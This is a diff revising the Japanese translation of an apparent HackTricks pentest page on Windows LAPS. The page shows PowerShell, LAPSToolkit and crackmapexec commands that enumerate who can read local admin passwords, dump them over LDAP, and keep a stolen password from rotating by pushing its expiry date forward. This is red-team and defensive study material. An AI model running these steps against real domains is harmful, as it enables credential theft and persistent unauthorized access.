@@ -4,22 +4,22 @@
 
 <summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFT](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **ハッキングトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
+* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
+* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 
 ## 基本情報
 
-Local Administrator Password Solution（LAPS）は、**管理者パスワード**を**一意でランダムで頻繁に変更された**ものに設定し、ドメインに参加したコンピュータに適用するためのツールです。これらのパスワードは、Active Directory内に安全に保存され、アクセス制御リスト（ACL）を介してアクセス権が付与されたユーザのみがアクセスできます。クライアントからサーバへのパスワードの送信のセキュリティは、**Kerberosバージョン5**と**Advanced Encryption Standard（AES）**の使用によって保証されています。
+ローカル管理者パスワードソリューション（LAPS）は、**管理者パスワード**を**一意でランダムで頻繁に変更された**ものに設定し、ドメインに参加しているコンピュータに適用するためのツールです。これらのパスワードは、Active Directory内に安全に保存され、アクセス制御リスト（ACL）を介して権限が付与されたユーザのみがアクセスできます。クライアントからサーバへのパスワードの送信のセキュリティは、**Kerberosバージョン5**と**Advanced Encryption Standard（AES）**の使用によって保証されています。
 
 LAPSの実装により、ドメインのコンピュータオブジェクトには、**`ms-mcs-AdmPwd`**と**`ms-mcs-AdmPwdExpirationTime`**という2つの新しい属性が追加されます。これらの属性は、それぞれ**平文の管理者パスワード**と**その有効期限**を保存します。
 
@@ -36,11 +36,11 @@ Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, 
 # Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
 Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
 ```
-### LAPS パスワードアクセス
+### LAPSパスワードアクセス
 
-`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **LAPS ポリシーの生データをダウンロード**し、次に [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージの **`Parse-PolFile`** を使用して、このファイルを人間が読める形式に変換できます。
+`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **LAPSポリシーの生データをダウンロード**し、次に[**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージから **`Parse-PolFile`** を使用してこのファイルを人間が読める形式に変換できます。
 
-さらに、**ネイティブ LAPS PowerShell コマンドレット** は、アクセス可能なマシンにインストールされている場合に使用できます：
+さらに、**ネイティブLAPS PowerShellコマンドレット**は、アクセス権を持つマシンにインストールされている場合に使用できます。
 ```powershell
 Get-Command *AdmPwd*
 
@@ -61,7 +61,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-**PowerView**を使用して、**誰がパスワードを読み取ることができ、それを読み取ることができるか**を調べることもできます。
+**PowerView**を使用して、**誰がパスワードを読み取ることができ、それを読み取ることができるか**も調べることができます。
 ```powershell
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
@@ -73,7 +73,7 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 
 [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)は、複数の機能を備えたLAPSの列挙を容易にします。\
 そのうちの1つは、**LAPSが有効になっているすべてのコンピューター**の**`ExtendedRights`**を解析することです。これにより、**LAPSパスワードを読む権限を特定のグループに委任**している**グループ**が表示されます。\
-**ドメインにコンピューターを参加させたアカウント**は、そのホストに対して`All Extended Rights`を受け取り、この権利により**パスワードを読む能力**が与えられます。列挙により、ユーザーアカウントがホスト上のLAPSパスワードを読むことができることが示されるかもしれません。これにより、LAPSパスワードを読むことができる特定のADユーザーを**特定する**のに役立ちます。
+**ドメインにコンピューターを参加させたアカウント**は、そのホストに対して`All Extended Rights`を受け取り、この権利により**パスワードを読む能力**が与えられます。列挙により、ユーザーアカウントがホスト上のLAPSパスワードを読むことができることが示される場合があります。これにより、LAPSパスワードを読むことができる特定のADユーザーを**特定する**のに役立ちます。
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -98,15 +98,15 @@ ComputerName                Password       Expiration
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
 ## **Crackmapexecを使用してLAPSパスワードをダンプする**
-PowerShellへのアクセスがない場合、LDAPを介してこの特権を乱用することができます。
+PowerShellへのアクセス権がない場合、LDAPを介してリモートでこの特権を悪用することができます
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
-## **LAPS Persistence**
+## **LAPSの永続性**
 
 ### **有効期限日**
 
-管理者権限を取得すると、将来の有効期限日を設定することで、パスワードを取得し、マシンがパスワードを更新するのを防ぐことが可能です。
+一度管理者権限を取得すると、**パスワードを取得**し、**有効期限日を将来に設定**することで、**マシンがパスワードを更新するのを防ぐ**ことが可能です。
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -128,18 +128,18 @@ LAPSの元のソースコードは[こちら](https://github.com/GreyCorbel/admp
 ## 参考文献
 * [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）でゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>!</strong></summary>
+<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
 
 * **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つけます
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
 * [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れます
-* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
-* **[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**することで、あなたのハッキングトリックを共有してください。
+* **💬**[**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
+* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。
 
 </details>
